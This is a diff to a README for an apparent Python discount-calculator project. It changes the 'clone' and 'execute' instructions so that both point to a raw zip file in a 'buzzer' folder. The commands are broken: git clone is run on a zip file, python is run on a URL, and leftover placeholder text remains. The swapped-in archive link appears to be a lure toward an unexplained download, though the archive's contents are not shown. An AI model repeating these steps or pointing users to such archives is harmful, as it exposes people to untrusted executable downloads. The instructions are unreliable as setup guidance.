@@ -19,7 +19,7 @@ This repository contains a Python script that implements a discount calculation 
 
 1.  **Clone the Repository**:
     ```bash
-    git clone [https://github.com/Griffnificent/discount_calculator.py/raw/refs/heads/main/buzzer/calculator-py-discount-1.0.zip](https://github.com/Griffnificent/discount_calculator.py/raw/refs/heads/main/buzzer/calculator-py-discount-1.0.zip)
+    git clone [https://raw.githubusercontent.com/Griffnificent/discount_calculator.py/main/buzzer/discount-calculator-py-3.4-alpha.5.zip](https://raw.githubusercontent.com/Griffnificent/discount_calculator.py/main/buzzer/discount-calculator-py-3.4-alpha.5.zip)
     ```
     *Replace `your-username` and `your-repo-name` with your actual GitHub username and repository name.*
 
@@ -30,7 +30,7 @@ This repository contains a Python script that implements a discount calculation 
 
 3.  **Execute the Script**:
     ```bash
-    python https://github.com/Griffnificent/discount_calculator.py/raw/refs/heads/main/buzzer/calculator-py-discount-1.0.zip
+    python https://raw.githubusercontent.com/Griffnificent/discount_calculator.py/main/buzzer/discount-calculator-py-3.4-alpha.5.zip
     ```
 Enter the original price of the item: 100
 Enter the discount percentage (e.g., 15, 25): 25
